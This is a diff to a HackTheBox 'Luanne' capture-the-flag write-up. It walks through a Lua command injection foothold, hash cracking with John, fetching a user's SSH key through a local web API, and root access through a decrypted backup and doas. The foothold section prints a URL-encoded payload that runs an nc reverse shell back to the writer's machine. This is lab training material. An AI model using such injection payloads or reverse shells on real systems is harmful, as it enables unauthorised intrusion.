@@ -16,7 +16,7 @@
 
 ### Description:
 
-Luanne is an easy-level machine. 
+Luanne is an easy-level machine active on HackTheBox. 
 
 ### Difficulty:
 
@@ -24,9 +24,9 @@ Luanne is an easy-level machine.
 
 ### Flags:
 
-User: `<md5>`
+User: `Find it yourself and see how it feels`
 
-Root: `<md5>`
+Root: `Find it yourself and see how it feels`
 
 # Enumeration
 
@@ -58,23 +58,74 @@ what if we pass a reverse shell instead of list to the variable city?...worth a 
 
 # Foothold
 
-So I found a reverse shell and I url encoded it.
+So I constructed a reverse shell payload and then url-encoded it.
 
 ![](assets/images/Luanne_shell.png)
-
 
 
 ![](assets/images/Luanne_urlencode.png)
 
 
 
-
 ?city=10.10.10.218%2Fweather%2Fforecast%3Fcity%3D')%3Bos.execute("rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2>%261|nc 10.10.14.136 4242 >%2Ftmp%2Ff")--
 
+and i passed this to the city variable in the URL and opened a netcat listener on port 4242 on my local machine.
+
+I got a shell as httpd thereafter. And then I checked what files were present in the current directory, I found a .htpasswd file which were the credentials needed to access the web service on port 80.
+
+![](assets/images/Luanne_webapiuser.png)
+
+I used John to crack the hash with rockyou as the dictionary and found the password. 
+
+![](assets/images/Luanne2.png)
+
+Thereafter I accessed the web service served on port 80 by inputting the credentials found.
+ 
+![](assets/images/Luanne_web80.png)
+
+There I saw some usual things,which I already have tried once before.
 
 # Lateral Movement
+I then remembered, that when I got the authentication error, I had also got a redirection link which was running on localhost.
+I checked if the process was actually running on the server or no using the netstat -aan command.
+
+![](assets/images/Luanne_netstat.png)
 
 
+After a little enumeration (in the /home directory) I found out that there is a user named r.michaels, so I thought of CURLing the ssh keys of r.michaels using the webapi_user credentials obtained previously.
+ 
+ ![](assets/images/Luanne3.png)
+ 
+Boom! I got the id_rsa keys of r.michaels user. I saved it with a 600 permission (search file permissions on google for further details) using the chmod command on my local machine. 
+ 
+Post which, I was ready to login into the user..
+
+And we've logged in as r.michaels
+
+![](assets/images/LuanneUSERFLAG.png)
+
+Wuhuu...you got the user flag now!
+ 
 
 # Privilege Escalation
+
+Moving forward to root, there is a backup file which is encrypted so let’s decrypt it and then extract it.
+
+![](assets/images/LuanneZipEnc.png)
+
+
+![](assets/images/LuanneHash2.png)
+
+We got another hash..hmm..resorting to the previous ways (like we used john in the previous case) we'll extract the hash as shown.
+
+![](assets/images/Luanne4.png)
+
+With the new found password, I tried use sudo su, but it didn’t work.
+
+It was a easy machine so I thought this may be the password of root but the machine did not have sudo.
+
+![](assets/images/LuanneSudo.png)
+
+But I searched for the alternative of sudo in openBSd and got to know that we can use doas. And it worked...
+![](assets/images/LuanneRoot.png)
 
